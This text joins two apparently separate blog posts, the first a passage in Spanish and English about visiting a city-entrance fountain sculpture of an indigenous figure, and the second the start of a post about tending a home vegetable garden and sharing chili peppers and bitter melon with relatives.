​​is located behind the fountain. In front of the fountain, you can see the indigenous figure holding a fish, a curious animal, and the gray pipes surrounding the figure. ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EprTf6LsQrs8VPKgm9AYsqFFfg2wD4M3AneX4Mejjf8HkujTsrWbQU7Be6t1PXBgkKX.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EqSWu8KwJhSSc5ec2mXtjsimSmkJzQTrxm9tPjLfSxqmqN9ruUg4swVH3muMTUd67qH.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EoEpaD2wNwXqsQfWynQcbU8Zn1oWKp9rbXEeeEwqcA6g27xVLr4mYmdGEnkm77unfRK.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/Eonk2DeMepZ2AgPkij3ZUvuUcf3WYj5JghUomK8pD7rasBvyH8KTF3n7z4b8Tzrnbjt.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EpviqtybGnscWU1nLH4ZDdaKzxhbehCYHJzg2DuNn7Yfi1gbKrWqvmyq8hDZ4CYk7Ay.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/Ep7uYgcL8FBn7Nn5ru5MRkcJ1wRgc7X1eQSk7qBnNrnQyN58Rns9g8kGUosprFNCJKu.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/23z7BhyGXwN2NbpgeJhkbhV6TgVydweCCBhEv5FnpCQAP7DkJfVH4frggSfL9Vxosrt4Q.png)

> Esta escultura es un símbolo muy importante para la ciudad. Originalmente se ubicaba en lo que hoy es el paso elevado Gran Mariscal de Ayacucho. Posteriormente, debido a renovaciones y la ampliación de la carretera, fue trasladada a la entrada de la ciudad y sirve como punto de referencia al ingresar a la primera ciudad del continente americano. La figura indígena se encuentra en el centro de la fuente, y junto a ella hay varios peces de los que brota agua. Esta fuente es un elemento cultural e histórico para la ciudad, ya que los indígenas que habitaban esta zona eran conocidos por su espíritu guerrero, que los impulsaba y motivaba a defender y proteger su territorio de los invasores. No es casualidad que la ciudad fuera incendiada en varias ocasiones debido al descontento de los indígenas con la presencia de los españoles y su intento de establecer una ciudad en el territorio que habitaban. Después de varios años, y con la evangelización de los indígenas, finalmente se estableció la ciudad conocida como la primera ciudad del continente americano. Esta es la primera vez que veo esta rotonda de cerca, y he recorrido sus diferentes áreas, jardines y escaleras. Aunque he pasado por esta avenida varias veces, nunca me había detenido a observar con detenimiento esta hermosa escultura. Para acceder a ella, hay dos escaleras y luego una pasarela de hormigón ubicada en la parte delantera y trasera de la rotonda. Las escaleras y la pasarela destacan por su hermoso diseño, que combina rocas y cemento. También se puede ver el acceso al distrbuidor. Fue una aventura maravillosa ver esta impresionante escultura de cerca y conocer sus detalles. Gracias por acompañarme en esta fascinante aventura.

> This sculpture is a very important symbol for the city. It was formerly located on what is now the Gran Mariscal de Ayacucho overpass. Later, due to renovations and the widening of the road, it was moved to the city's entrance and serves as a landmark when entering the first city of the American continent. The indigenous figure is located in the center of the fountain, and next to him are several fish from which water emerges. This fountain is a cultural and historical element for the city, as the indigenous people who inhabited this area were known for their warrior spirit, which drove and motivated them to defend and protect their territory from invaders. It is no coincidence that the city was burned on several occasions due to the indigenous people's discontent with the presence of the Spanish and their attempt to establish a city in the territory they inhabited. After several years, and with the evangelization of the indigenous people, the city known as the first city of the American continent was finally established. This is the first time I've seen this roundabout up close, and I've taken a tour of its different areas, gardens, and staircases. Although I've passed by this avenue several times, I'd never stopped to take a closer look at this beautiful sculpture. To access it, there are two staircases and then a concrete walkway located at the front and back of the roundabout. The staircases and walkway stand out for their lovely design, combining rocks and cement. You can also see the access point for the interchange. It was a wonderful adventure to see this striking sculpture up close and learn its details. Thank you for joining me on this fascinating adventure. ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EppLCBP4d6RrNudJJmZCvE9Mz9g7ChoG9Tmhb9EKDrsVogyycxYPnVBW9RR1vLzza65.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EppKkjjv3p7qPM3qCUNrFAasXSTZfjLKUf8AJXggc7Lcs1KgcDTzheB8PS4RJRXRdZ9.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/Ep7vcimi3SBWG6Ag2jpwtJoR1oMvKq6GGC2YKEU7uHtBTWDxs3XoUphq7SgX68vYW2W.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/Eq7Mp64cVW9m2FQEtFr9ubGD8SUjw66WoPcWGixtSVMwKWTqofHboudZc5STMbJzmuA.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EoeGLNxXm6sNqXbLu64GMGbDvUL2J9GwPDprV7Kzq4KCKx9aVJBtGEjxSN4JmX4Li1A.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EnWGzMf6u9fE7xiao2h7HbE5rfPi9xZ1YNJqodrjQ5H11NMtw1XzixNViWqWZqzjU4R.png) ![separador virgilio.png](https://files.peakd.com/file/peakd-hive/virgilio07/48KdAZ2oktyDRja9ez5m3v1qBY6PZfFU8sSGEE17ey9FUfktwmCJiLv2c2YiZggq73.png)

title.body:
![](https://i.ecency.com/DQmWHM3HLcDxfvwSpBiFsnm8dqKw8duf6aPvYJ8D12Y7S1d/1779696962251.jpg)

Hello everyone. How are you today? I hope all is well with you and your family. On days my wife and I didn't go anywhere after dropping granddaughter and autistic son off at school, I love strolling around and taking care of vegetables and fruit in my home garden. And often share vegetables and fruits in my home garden. Today too, we have free time and don't go anywhere. I spend some of my free time in the garden in the morning. I also pick a few vegetables in the home garden too, but there are only a few kinds in my garden that I pick them almost daily before they spoil. Such as many kinds of chili peppers and bitter melon. Even though my wife and I want to eat them fresh, these vegetables produce so much that we can't eat them all in time, and they go to waste. Therefore, my wife or I pick these vegetables almost every day to save for later, but sometimes we also share them with our neighbors or relatives. And sometimes our neighbors or relatives also share them with us. A few days ago, one of our relative gave me three bunches of lychees, so I want to pick some chili peppers and bitter melons to share them with that relative today.
